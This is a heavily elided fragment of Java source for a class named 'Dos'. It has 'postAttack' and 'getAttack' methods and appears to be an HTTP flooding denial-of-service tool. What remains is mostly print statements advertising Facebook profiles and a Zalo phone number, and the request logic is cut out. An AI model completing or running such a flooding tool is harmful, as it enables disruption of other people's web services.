...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.println("ADD FB: https://www.facebook.com/trung.hai.62/");
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("ADD FB: https://www.facebook.com/Dtd.Dz.Profile: " + "ZALO:0387827855 Connection timed out!" + this.seq);
    }
    ...
    private void getAttack(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        System.out.println("ADD FB: https://www.facebook.com/Dtd.Dz.Profile: " + "ZALO: 0387827855 Connection timed out! ");
    }
